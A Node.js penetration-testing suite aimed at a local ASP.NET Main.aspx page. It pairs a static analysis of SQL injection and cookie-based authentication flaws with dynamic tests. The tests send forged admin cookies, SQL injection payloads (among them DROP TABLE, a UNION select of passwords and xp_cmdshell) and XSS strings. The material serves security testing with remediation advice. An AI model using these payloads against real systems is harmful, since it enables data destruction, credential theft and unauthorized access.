const axios = require('axios');
const colors = require('colors');

class MainAspxPenetrationTester {
    constructor(baseUrl = 'http://localhost:44393') {
        this.baseUrl = baseUrl;
        this.vulnerabilities = [];
        this.testResults = [];
    }

    log(message, type = 'info') {
        const timestamp = new Date().toISOString();
        switch(type) {
            case 'success':
                console.log(`[${timestamp}] âœ“ ${message}`.green);
                break;
            case 'warning':
                console.log(`[${timestamp}] âš  ${message}`.yellow);
                break;
            case 'error':
                console.log(`[${timestamp}] âœ— ${message}`.red);
                break;
            case 'critical':
                console.log(`[${timestamp}] ðŸš¨ CRITICAL: ${message}`.red.bold);
                break;
            default:
                console.log(`[${timestamp}] â„¹ ${message}`.blue);
        }
    }

    addVulnerability(severity, title, description, impact, recommendation) {
        this.vulnerabilities.push({
            severity,
            title,
            description,
            impact,
            recommendation,
            timestamp: new Date().toISOString()
        });
    }

    // Test 1: Authentication Bypass via Cookie Manipulation
    async testCookieManipulation() {
        this.log('Testing Cookie Manipulation Vulnerabilities...', 'info');
        
        const testCases = [
            {
                name: 'Missing Cookie Test',
                cookies: {},
                expected: 'redirect_to_login'
            },
            {
                name: 'Invalid Username Cookie',
                cookies: {
                    userinfo: 'username=HACKER&usertype=1&userid=999&role=Admin&LA=Y&companyname=YTL&userslist=1,2,3&customrole=admin'
                },
                expected: 'potential_bypass'
            },
            {
                name: 'SQL Injection in Cookie',
                cookies: {
                    userinfo: "username=admin'--&usertype=1&userid=1&role=Admin"
                },
                expected: 'sql_injection'
            },
            {
                name: 'Privilege Escalation',
                cookies: {
                    userinfo: 'username=TESTUSER&usertype=1&userid=1&role=Admin&LA=Y&companyname=YTL'
                },
                expected: 'privilege_escalation'
            }
        ];

        for (const testCase of testCases) {
            try {
                const response = await axios.get(`${this.baseUrl}/Main.aspx?n=TESTUSER`, {
                    headers: {
                        'Cookie': testCase.cookies.userinfo ? `userinfo=${testCase.cookies.userinfo}` : ''
                    },
                    maxRedirects: 0,
                    validateStatus: () => true
                });

                if (response.status === 302 && response.headers.location?.includes('Login.aspx')) {
                    this.log(`${testCase.name}: Properly redirected to login`, 'success');
                } else if (response.status === 200) {
                    this.addVulnerability(
                        'HIGH',
                        'Authentication Bypass',
                        `${testCase.name} allowed access without proper authentication`,
                        'Unauthorized access to protected resources',
                        'Implement server-side session validation and proper authentication checks'
                    );
                    this.log(`${testCase.name}: VULNERABILITY FOUND - Authentication bypassed!`, 'critical');
                }
            } catch (error) {
                this.log(`${testCase.name}: Error - ${error.message}`, 'error');
            }
        }
    }

    // Test 2: SQL Injection in Database Queries
    async testSQLInjection() {
        this.log('Testing SQL Injection Vulnerabilities...', 'info');
        
        const sqlPayloads = [
            "1' OR '1'='1",
            "1'; DROP TABLE userTBL; --",
            "1' UNION SELECT 1,username,password FROM userTBL --",
            "1'; EXEC xp_cmdshell('dir'); --",
            "1' AND (SELECT COUNT(*) FROM userTBL) > 0 --"
        ];

        // Test userid parameter injection
        for (const payload of sqlPayloads) {
            try {
                const maliciousCookie = `username=TESTUSER&usertype=1&userid=${encodeURIComponent(payload)}&role=User&LA=N&companyname=TEST`;
                
                const response = await axios.get(`${this.baseUrl}/Main.aspx?n=TESTUSER`, {
                    headers: {
                        'Cookie': `userinfo=${maliciousCookie}`
                    },
                    timeout: 10000,
                    validateStatus: () => true
                });

                // Check for SQL error messages or unusual behavior
                if (response.data.includes('SQL') || 
                    response.data.includes('OLE DB') || 
                    response.data.includes('ODBC') ||
                    response.status === 500) {
                    
                    this.addVulnerability(
                        'CRITICAL',
                        'SQL Injection',
                        `SQL injection possible with payload: ${payload}`,
                        'Complete database compromise, data theft, system takeover',
                        'Use parameterized queries and input validation'
                    );
                    this.log(`SQL Injection found with payload: ${payload}`, 'critical');
                }
            } catch (error) {
                if (error.code === 'ECONNRESET' || error.message.includes('timeout')) {
                    this.log(`Potential SQL injection causing server issues with payload: ${payload}`, 'warning');
                }
            }
        }
    }

    // Test 3: Cross-Site Scripting (XSS)
    async testXSS() {
        this.log('Testing Cross-Site Scripting Vulnerabilities...', 'info');
        
        const xssPayloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>"
        ];

        for (const payload of xssPayloads) {
            try {
                const maliciousCookie = `username=${encodeURIComponent(payload)}&usertype=1&userid=1&role=User`;
                
                const response = await axios.get(`${this.baseUrl}/Main.aspx?n=${encodeURIComponent(payload)}`, {
                    headers: {
                        'Cookie': `userinfo=${maliciousCookie}`
                    },
                    validateStatus: () => true
                });

                if (response.data.includes(payload) && !response.data.includes('&lt;') && !response.data.includes('&gt;')) {
                    this.addVulnerability(
                        'HIGH',
                        'Cross-Site Scripting (XSS)',
                        `XSS vulnerability found with payload: ${payload}`,
                        'Session hijacking, credential theft, malicious redirects',
                        'Implement proper input validation and output encoding'
                    );
                    this.log(`XSS vulnerability found with payload: ${payload}`, 'critical');
                }
            } catch (error) {
                this.log(`XSS test error with payload ${payload}: ${error.message}`, 'error');
            }
        }
    }

    // Test 4: Session Management Issues
    async testSessionManagement() {
        this.log('Testing Session Management Vulnerabilities...', 'info');
        
        // Test session fixation
        try {
            const response1 = await axios.get(`${this.baseUrl}/Main.aspx?n=TESTUSER`, {
                headers: {
                    'Cookie': 'userinfo=username=TESTUSER&usertype=1&userid=1&role=User'
                },
                validateStatus: () => true
            });

            const response2 = await axios.get(`${this.baseUrl}/Main.aspx?n=TESTUSER`, {
                headers: {
                    'Cookie': 'userinfo=username=TESTUSER&usertype=1&userid=1&role=User'
                },
                validateStatus: () => true
            });

            if (response1.status === 200 && response2.status === 200) {
                this.addVulnerability(
                    'MEDIUM',
                    'Session Management Issues',
                    'Sessions appear to be client-side controlled via cookies',
                    'Session hijacking and fixation attacks',
                    'Implement server-side session management with secure tokens'
                );
                this.log('Session management vulnerability detected', 'warning');
            }
        } catch (error) {
            this.log(`Session management test error: ${error.message}`, 'error');
        }
    }

    // Test 5: Authorization Bypass
    async testAuthorizationBypass() {
        this.log('Testing Authorization Bypass Vulnerabilities...', 'info');
        
        const privilegeTests = [
            {
                name: 'Regular User to Admin',
                cookie: 'username=REGULARUSER&usertype=1&userid=999&role=Admin&LA=Y',
                expected: 'admin_access'
            },
            {
                name: 'Special User Bypass',
                cookie: 'username=SPYON&usertype=1&userid=999&role=User',
                expected: 'special_privileges'
            },
            {
                name: 'YTL User Impersonation',
                cookie: 'username=FAKEUSER&usertype=1&userid=999&role=User&companyname=YTL Communications',
                expected: 'ytl_privileges'
            }
        ];

        for (const test of privilegeTests) {
            try {
                const response = await axios.get(`${this.baseUrl}/Main.aspx?n=${test.cookie.split('&')[0].split('=')[1]}`, {
                    headers: {
                        'Cookie': `userinfo=${test.cookie}`
                    },
                    validateStatus: () => true
                });

                if (response.status === 200) {
                    this.addVulnerability(
                        'HIGH',
                        'Authorization Bypass',
                        `${test.name}: Unauthorized privilege escalation possible`,
                        'Unauthorized access to administrative functions',
                        'Implement proper server-side authorization checks'
                    );
                    this.log(`Authorization bypass found: ${test.name}`, 'critical');
                }
            } catch (error) {
                this.log(`Authorization test error for ${test.name}: ${error.message}`, 'error');
            }
        }
    }

    // Test 6: Information Disclosure
    async testInformationDisclosure() {
        this.log('Testing Information Disclosure Vulnerabilities...', 'info');
        
        try {
            // Test for error message disclosure
            const response = await axios.get(`${this.baseUrl}/Main.aspx?n=TESTUSER`, {
                headers: {
                    'Cookie': 'userinfo=invalid_cookie_format'
                },
                validateStatus: () => true
            });

            if (response.data.includes('System.') || 
                response.data.includes('Exception') || 
                response.data.includes('Stack Trace') ||
                response.data.includes('SqlConnection')) {
                
                this.addVulnerability(
                    'MEDIUM',
                    'Information Disclosure',
                    'Application reveals sensitive system information in error messages',
                    'Information leakage that aids further attacks',
                    'Implement custom error pages and proper error handling'
                );
                this.log('Information disclosure vulnerability found', 'warning');
            }
        } catch (error) {
            this.log(`Information disclosure test error: ${error.message}`, 'error');
        }
    }

    // Generate comprehensive report
    generateReport() {
        this.log('\n' + '='.repeat(80), 'info');
        this.log('PENETRATION TEST REPORT FOR MAIN.ASPX', 'info');
        this.log('='.repeat(80), 'info');
        
        if (this.vulnerabilities.length === 0) {
            this.log('No vulnerabilities found during testing.', 'success');
            return;
        }

        const criticalVulns = this.vulnerabilities.filter(v => v.severity === 'CRITICAL');
        const highVulns = this.vulnerabilities.filter(v => v.severity === 'HIGH');
        const mediumVulns = this.vulnerabilities.filter(v => v.severity === 'MEDIUM');
        const lowVulns = this.vulnerabilities.filter(v => v.severity === 'LOW');

        this.log(`\nVULNERABILITY SUMMARY:`, 'info');
        this.log(`Critical: ${criticalVulns.length}`, criticalVulns.length > 0 ? 'critical' : 'info');
        this.log(`High: ${highVulns.length}`, highVulns.length > 0 ? 'error' : 'info');
        this.log(`Medium: ${mediumVulns.length}`, mediumVulns.length > 0 ? 'warning' : 'info');
        this.log(`Low: ${lowVulns.length}`, 'info');

        this.log('\nDETAILED FINDINGS:', 'info');
        this.log('-'.repeat(50), 'info');

        this.vulnerabilities.forEach((vuln, index) => {
            this.log(`\n${index + 1}. ${vuln.title} [${vuln.severity}]`, 
                vuln.severity === 'CRITICAL' ? 'critical' : 
                vuln.severity === 'HIGH' ? 'error' : 
                vuln.severity === 'MEDIUM' ? 'warning' : 'info');
            
            console.log(`   Description: ${vuln.description}`);
            console.log(`   Impact: ${vuln.impact}`);
            console.log(`   Recommendation: ${vuln.recommendation}`);
        });

        this.log('\nRECOMMENDATIONS:', 'info');
        this.log('-'.repeat(50), 'info');
        this.log('1. Implement server-side session management', 'info');
        this.log('2. Use parameterized SQL queries', 'info');
        this.log('3. Add proper input validation and sanitization', 'info');
        this.log('4. Implement proper authorization checks', 'info');
        this.log('5. Add custom error handling', 'info');
        this.log('6. Use HTTPS for all communications', 'info');
        this.log('7. Implement CSRF protection', 'info');
        this.log('8. Add security headers', 'info');
    }

    // Run all penetration tests
    async runAllTests() {
        this.log('Starting Penetration Testing for Main.aspx...', 'info');
        this.log('Target: ' + this.baseUrl, 'info');
        this.log('-'.repeat(80), 'info');

        await this.testCookieManipulation();
        await this.testSQLInjection();
        await this.testXSS();
        await this.testSessionManagement();
        await this.testAuthorizationBypass();
        await this.testInformationDisclosure();

        this.generateReport();
    }
}

// Static Analysis of the VB.NET Code
class StaticAnalyzer {
    constructor() {
        this.codeIssues = [];
    }

    analyzeMainAspxCode() {
        console.log('\n' + '='.repeat(80).cyan);
        console.log('STATIC CODE ANALYSIS RESULTS'.cyan);
        console.log('='.repeat(80).cyan);

        const issues = [
            {
                severity: 'CRITICAL',
                line: 'cmd = New SqlCommand("select top 1 id from dbo.alert_notification " & condition',
                issue: 'SQL Injection Vulnerability',
                description: 'Direct string concatenation in SQL query with user-controlled input',
                recommendation: 'Use parameterized queries: cmd.Parameters.AddWithValue("@condition", condition)'
            },
            {
                severity: 'CRITICAL',
                line: 'cmd = New SqlCommand("select itenery from dbo.userTBL where userid=" & userid',
                issue: 'SQL Injection Vulnerability',
                description: 'Direct concatenation of userid parameter in SQL query',
                recommendation: 'Use parameterized queries: cmd.Parameters.AddWithValue("@userid", userid)'
            },
            {
                severity: 'HIGH',
                line: 'If Request.Cookies("userinfo") Is Nothing Then',
                issue: 'Client-Side Authentication',
                description: 'Authentication relies entirely on client-side cookies',
                recommendation: 'Implement server-side session management with secure tokens'
            },
            {
                severity: 'HIGH',
                line: 'username = Request.Cookies("userinfo")("username").ToUpper()',
                issue: 'Unvalidated Cookie Data',
                description: 'Cookie data is used without validation or sanitization',
                recommendation: 'Validate and sanitize all cookie data before use'
            },
            {
                severity: 'MEDIUM',
                line: 'If uname.ToString.ToUpper() <> username Then',
                issue: 'Weak Username Validation',
                description: 'Username comparison can be bypassed with URL manipulation',
                recommendation: 'Implement proper session-based authentication'
            },
            {
                severity: 'MEDIUM',
                line: 'Catch ex As Exception',
                issue: 'Generic Exception Handling',
                description: 'Generic exception handling may hide security issues',
                recommendation: 'Implement specific exception handling and logging'
            },
            {
                severity: 'LOW',
                line: 'Public username As String = ""',
                issue: 'Public Variables',
                description: 'Sensitive data stored in public variables',
                recommendation: 'Use private variables with proper access controls'
            }
        ];

        issues.forEach((issue, index) => {
            const color = issue.severity === 'CRITICAL' ? 'red' : 
                         issue.severity === 'HIGH' ? 'yellow' : 
                         issue.severity === 'MEDIUM' ? 'cyan' : 'white';
            
            console.log(`\n${index + 1}. ${issue.issue} [${issue.severity}]`[color]);
            console.log(`   Code: ${issue.line}`.gray);
            console.log(`   Issue: ${issue.description}`);
            console.log(`   Fix: ${issue.recommendation}`.green);
        });

        console.log('\nSUMMARY:'.cyan);
        console.log(`Critical Issues: ${issues.filter(i => i.severity === 'CRITICAL').length}`.red);
        console.log(`High Issues: ${issues.filter(i => i.severity === 'HIGH').length}`.yellow);
        console.log(`Medium Issues: ${issues.filter(i => i.severity === 'MEDIUM').length}`.cyan);
        console.log(`Low Issues: ${issues.filter(i => i.severity === 'LOW').length}`.white);
    }
}

// Main execution
async function main() {
    console.log('ASP.NET Main.aspx Penetration Testing Suite'.rainbow);
    console.log('=========================================='.rainbow);
    
    // Run static analysis first
    const staticAnalyzer = new StaticAnalyzer();
    staticAnalyzer.analyzeMainAspxCode();
    
    // Run dynamic tests (commented out since we don't have a running server)
    console.log('\nNOTE: Dynamic testing requires a running ASP.NET server.'.yellow);
    console.log('To run dynamic tests, ensure your application is running and uncomment the following lines:\n'.yellow);
    
    console.log('// const pentester = new MainAspxPenetrationTester("http://localhost:44393");'.gray);
    console.log('// await pentester.runAllTests();'.gray);
    
    console.log('\nPenetration testing analysis complete!'.green);
}

main().catch(console.error);